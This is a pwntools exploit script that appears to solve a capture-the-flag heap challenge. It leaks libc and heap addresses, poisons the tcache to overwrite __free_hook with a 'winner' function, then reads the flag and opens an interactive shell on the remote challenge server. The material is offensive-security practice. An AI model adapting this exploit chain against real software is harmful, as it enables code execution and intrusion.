#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './soal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.160.212.3', 17005

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x401611
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# pwndbg> checksec
# Arch:     amd64
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x3fe000)
# RUNPATH:    b'.'
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

def alloc(idx, size):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())

def edit(idx, content):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', content)

def view(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())

def free(idx):
    io.sendlineafter(b':', b'4')
    io.sendlineafter(b':', str(idx).encode())

def exploit():
    global io
    io = initialize()

    alloc(0, 0x418)
    alloc(1, 0x10)
    alloc(2, 0x10)
    free(0)

    alloc(0, 0x418)
    view(0)

    io.recvuntil(b'content : ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x1ecbe0

    free(1)
    free(2)
    alloc(2, 0x18)
    view(2)

    io.recvuntil(b'content : ')
    heap = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x1ae0
    
    alloc(1, 0x18)

    free(2)
    free(1)

    edit(0, b'\x00' * 0x418 + p64(0x21) + p64(libc.sym['__free_hook']))

    alloc(1, 0x18)
    alloc(2, 0x18)

    edit(2, p64(elf.sym['winner']))
    
    free(0)
    io.sendline(b'cat flag*')

    log.info("libc base: %#x", libc.address)
    log.info("heap base: %#x", heap)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
